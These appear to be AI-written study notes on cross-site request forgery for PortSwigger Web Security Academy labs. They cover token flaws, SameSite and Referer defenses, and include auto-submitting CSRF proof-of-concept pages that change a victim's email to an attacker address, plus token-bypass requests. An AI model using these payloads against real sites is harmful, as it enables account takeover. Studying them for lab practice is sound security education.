

---



## 1. What is CSRF

**Cross-Site Request Forgery (CSRF)** is a vulnerability that **forces a victim to perform unwanted actions on a web application in which they are authenticated**. ([PortSwigger](https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery?utm_source=chatgpt.com "Using Burp to Test for Cross-Site Request Forgery (CSRF) - PortSwigger"))

It occurs when a web application:

- relies on **cookies for authentication**
    
- performs **state-changing actions**
    
- does **not properly verify the request origin**
    

Because browsers automatically include cookies in requests, an attacker can trick a victim’s browser into sending a request to the vulnerable application. ([PortSwigger](https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery?utm_source=chatgpt.com "Using Burp to Test for Cross-Site Request Forgery (CSRF) - PortSwigger"))

---

# 2. Example CSRF Scenario (PortSwigger Style)

A typical vulnerable feature is **changing an account email**.

Example HTML form:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="example@normal-website.com">
<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
<button class='button' type='submit'> Update email </button>
</form>
```

When submitted, the browser sends:

```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

The server checks the **CSRF token** before processing the request. ([DEV Community](https://dev.to/ayako_yk/understanding-csrf-attacks-how-they-work-and-how-to-protect-your-website-3b2o?utm_source=chatgpt.com "Understanding CSRF Attacks: How They Work and How to Protect Your Website - DEV Community"))

---

# 3. Conditions Required for a CSRF Attack

PortSwigger identifies **three key conditions**.

### 1. A Relevant Action

The application performs a **state-changing action**, for example:

```
Change email
Change password
Transfer funds
Update account settings
```

---

### 2. Cookie-Based Authentication

The application uses cookies to identify users.

Example:

```
Cookie: session=Y3c7Hk9j
```

Browsers automatically include cookies in cross-site requests.

---

### 3. Predictable Request Parameters

If an attacker can **predict the request parameters**, they can forge the request.

Example request:

```
POST /my-account/change-email
email=attacker@evil.com
```

---

# 4. Basic CSRF Attack

An attacker can create a malicious HTML page.

Example exploit:

```html
<form action="https://victim.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
```

If the victim visits the attacker’s page while logged in, their email will be changed.

Example real attack payload used in labs:

```html
<html>
<body>
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

If successful, the victim’s email becomes **[pwned@evil-user.net](mailto:pwned@evil-user.net)**. ([LearnHacking.io](https://learnhacking.io/portswiggers-csrf-vulnerability-with-no-defenses-walkthrough/?utm_source=chatgpt.com "PortSwigger's \"CSRF vulnerability with no defenses\" Walkthrough"))

---

# 5. Testing CSRF with Burp Suite (PortSwigger Method)

Typical testing workflow:

### Step 1

Intercept request when submitting a sensitive action.

Example:

```
POST /my-account/change-email
```

---

### Step 2

Right-click request in Burp:

```
Engagement tools → Generate CSRF PoC
```

---

### Step 3

Burp generates HTML exploit:

```html
<form action="https://target/my-account/change-email" method="POST">
<input type="hidden" name="email" value="newemail@malicious.com">
</form>
```

---

### Step 4

Host the HTML and send it to the victim.

If their account email changes, the application is vulnerable. ([PortSwigger](https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery?utm_source=chatgpt.com "Using Burp to Test for Cross-Site Request Forgery (CSRF) - PortSwigger"))

---

# 6. CSRF Tokens (Primary Defense)

A **CSRF token** is a random value included in requests.

Example:

```
<input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
```

When the form is submitted:

```
csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u
```

The server checks the token.

If:

```
token missing
token invalid
```

The request is rejected. ([DEV Community](https://dev.to/ayako_yk/understanding-csrf-attacks-how-they-work-and-how-to-protect-your-website-3b2o?utm_source=chatgpt.com "Understanding CSRF Attacks: How They Work and How to Protect Your Website - DEV Community"))

---

# 7. Common Flaws in CSRF Token Validation (PortSwigger Labs)

## 1. Validation depends on request method

Some apps check tokens only for **POST**.

Example request:

```
POST /my-account/change-email
csrf=token
```

Attack:

Convert to GET:

```
GET /my-account/change-email?email=attacker@evil.com
```

The token is no longer validated. ([PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method?utm_source=chatgpt.com "Lab: CSRF where token validation depends on request method | Web Security Academy"))

---

## 2. Validation depends on token presence

Some apps validate tokens **only if present**.

Example request:

```
POST /my-account/change-email
email=test@evil.com
csrf=token
```

Attack:

Remove token entirely:

```
POST /my-account/change-email
email=test@evil.com
```

Request is accepted.

This is an actual PortSwigger lab. ([PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present?utm_source=chatgpt.com "Lab: CSRF where token validation depends on token being present | Web Security Academy"))

---

## 3. Token not tied to user session

If tokens are global:

```
csrf=12345
```

An attacker can:

1. login to their own account
    
2. obtain token
    
3. reuse token for victim
    

---

## 4. Token duplicated in cookie

Example:

```
Cookie: csrf=12345
Form: csrf=12345
```

If the attacker can set the cookie, they can bypass protection.

---

# 8. SameSite Cookie Protection

Modern browsers support the **SameSite cookie attribute**.

Example:

```
Set-Cookie: session=abc123; SameSite=Lax
```

SameSite restricts cookies in cross-site requests.

Modes:

### Strict

Cookies only sent in **same-site requests**.

---

### Lax

Cookies allowed for:

```
Top-level GET navigation
```

But blocked for:

```
POST requests
```

---

### None

Cookies sent in all contexts.

Must include:

```
Secure
```

---

# 9. Referer-Based CSRF Defense

Some apps validate the **Referer header**.

Example:

```
Referer: https://victim.com/account
```

Server checks:

```
If referer != victim.com → block request
```

Problems:

- Referer header may be **missing**
    
- Privacy tools may remove it
    

Therefore it is **not reliable protection**.

---

# 10. Real Impact of CSRF

If exploited successfully, CSRF can allow attackers to:

```
Change email address
Reset password
Transfer money
Perform admin actions
Modify account settings
```

Example scenario:

1. attacker changes victim email
    
2. attacker performs password reset
    
3. attacker gains account access
    

---

# 11. CSRF vs XSS (Important)

|Vulnerability|Capability|
|---|---|
|CSRF|Send requests|
|XSS|Send requests + read responses|

With **XSS**, attackers can perform CSRF easily.

---

# 12. Typical PortSwigger Lab Structure

Most CSRF labs follow this pattern:

```
Login with credentials
Find change-email feature
Intercept request
Analyze CSRF token behavior
Build CSRF PoC
Deliver exploit to victim
```

Example lab credentials:

```
wiener:peter
```

Used in several CSRF labs. ([PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present?utm_source=chatgpt.com "Lab: CSRF where token validation depends on token being present | Web Security Academy"))

---

# 13. Standard CSRF PoC Template

Typical payload used in labs:

```html
<html>
<body>

<form action="https://victim.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

---

# Pentester Quick Checklist

When testing an endpoint:

```
Does it change application state?
Does it rely on cookies?
Is there a CSRF token?
Is the token validated properly?
Can the token be removed?
Can the request method be changed?
```

If weaknesses exist → **CSRF likely exploitable**.

---

✅ These notes closely follow the **structure, terminology, and examples used in PortSwigger Web Security Academy** while keeping them organized for pentesting study.

---

If you want, I can also create something **extremely useful for your PortSwigger labs**:

- **Full CSRF lab walkthrough methodology**
    
- **All CSRF bypass techniques PortSwigger teaches**
    
- **Professional pentester cheat sheet for CSRF**
    

That one is **10× more useful when solving the labs**.